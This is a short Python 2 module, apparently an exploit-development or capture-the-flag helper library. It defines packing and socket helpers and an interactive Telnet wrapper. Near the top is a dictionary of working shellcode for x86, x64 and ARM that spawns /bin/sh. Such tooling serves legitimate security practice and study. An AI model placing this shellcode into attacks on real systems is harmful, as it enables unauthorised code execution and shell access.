import os
import re
import struct
import socket
from telnetlib import Telnet
from subprocess import Popen
from threading import Thread, Event

shellcode = {
    'x86': '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
    'x64': '\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
    'arm': '\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
}

def p32(x):
    return struct.pack('<I', x)

def p64(x):
    return struct.pack('<Q', x)

def u32(x):
    return struct.unpack('<I', x)[0]

def u64(x):
    return struct.unpack('<Q', x)[0]

def connect_process(args):
    def run_server(s, e, args):
        c, addr = s.accept()
        s.close()

        try:
            p = Popen(args, stdin=c, stdout=c, stderr=c, preexec_fn=lambda: os.setsid())
        except Exception as err:
            c.close()
            e.set()
            raise err

        e.set()
        p.wait()
        c.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 0))  # INADDR_ANY, INPORT_ANY
    s.listen(1)

    e = Event()
    t = Thread(target=run_server, args=(s, e, args))
    t.daemon = True
    t.start()
    c = socket.create_connection(s.getsockname())
    e.wait()

    return c

def disconnect(s):
    s.shutdown(socket.SHUT_WR)

def recvuntil(s, term):
    buf = ''
    while not buf.endswith(term):
        buf += s.recv(1)
    return buf

def expect(s, term):
    buf = ''
    while not re.search(term, buf):
        buf += s.recv(1)
    return buf

def recvline(s):
    return recvuntil(s, '\n')

def sendline(s, buf):
    s.sendall(buf+'\n')

def interact(s):
    t = Telnet()
    t.sock = s
    t.interact()
    disconnect(s)
